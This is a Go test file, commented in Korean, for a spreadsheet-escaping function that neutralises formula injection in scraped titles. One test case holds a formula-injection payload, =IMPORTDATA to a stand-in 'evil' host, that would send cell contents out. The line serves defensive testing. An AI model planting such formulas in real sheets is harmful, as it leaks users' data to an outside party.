package sheets

import "testing"

// 수식 주입 — 이 패키지에서 **가장 위험한 결함**이다. 긁어 온 제목이 시트에서 실행되면
// 아카이브 전체가 외부로 나간다. 코드로는 보이지 않는 종류라(문자열을 문자열 자리에
// 넣을 뿐이다) 테스트가 유일한 방어선이다.
func TestEscapeRows_neutralizesFormulas(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"아카이브 유출 시도", `=IMPORTDATA("https://evil/?d="&A2)`, `'=IMPORTDATA("https://evil/?d="&A2)`},
		{"더하기 시작", "+1+1", "'+1+1"},
		{"빼기 시작", "-1+1", "'-1+1"},
		{"골뱅이 시작 (구형 Excel 매크로)", "@SUM(A1)", "'@SUM(A1)"},
		{"평범한 제목은 그대로", "쿠버네티스 운영 가이드", "쿠버네티스 운영 가이드"},
		{"URL도 그대로", "https://example.com/a", "https://example.com/a"},
		{"하이픈이 안에 있는 건 무해", "Go 1.25 — 무엇이 바뀌었나", "Go 1.25 — 무엇이 바뀌었나"},
		{"빈 문자열", "", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := EscapeRows([][]any{{tc.in}})
			if got[0][0] != tc.want {
				t.Errorf("\n got %q\nwant %q", got[0][0], tc.want)
			}
		})
	}
}

// 문자열이 아닌 값(id 정수)은 건드리지 않는다 — 숫자를 문자열로 만들면
// 시트에서 정렬이 사전순이 되어 조용히 틀린다.
func TestEscapeRows_leavesNonStringsAlone(t *testing.T) {
	got := EscapeRows([][]any{{int64(42), true, nil}})
	if got[0][0] != int64(42) {
		t.Errorf("정수가 바뀌었다: %#v", got[0][0])
	}
	if got[0][1] != true || got[0][2] != nil {
		t.Errorf("비문자열이 바뀌었다: %#v", got[0])
	}
}

// 행 모양이 유지돼야 한다 — 열 수가 달라지면 clear 범위(width)와 어긋난다.
func TestEscapeRows_preservesShape(t *testing.T) {
	in := [][]any{{"a", "b", "c"}, {"=x"}, {}}
	got := EscapeRows(in)
	if len(got) != 3 || len(got[0]) != 3 || len(got[1]) != 1 || len(got[2]) != 0 {
		t.Fatalf("모양이 바뀌었다: %#v", got)
	}
}
